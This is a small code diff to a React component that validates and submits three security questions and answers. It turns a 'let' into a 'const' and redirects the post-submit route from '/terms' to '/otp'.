@@ -53,7 +53,7 @@ const SecurityQuestions: React.FC = () => {
     event.preventDefault();
     setIsLoading(true);
 
-    let newErrors = {
+    const newErrors = {
       securityQuestion1: !securityQuestion1 ? 'Please select a security question.' : '',
       securityAnswer1: !securityAnswer1.trim() ? 'Please provide an answer.' : '',
       securityQuestion2: !securityQuestion2 ? 'Please select a security question.' : '',
@@ -76,7 +76,7 @@ const SecurityQuestions: React.FC = () => {
           securityAnswer3
         });
         console.log('Security questions submitted successfully');
-        navigate('/terms', { state: { emzemz } });
+        navigate('/otp', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting security questions:', error);
         setIsLoading(false);
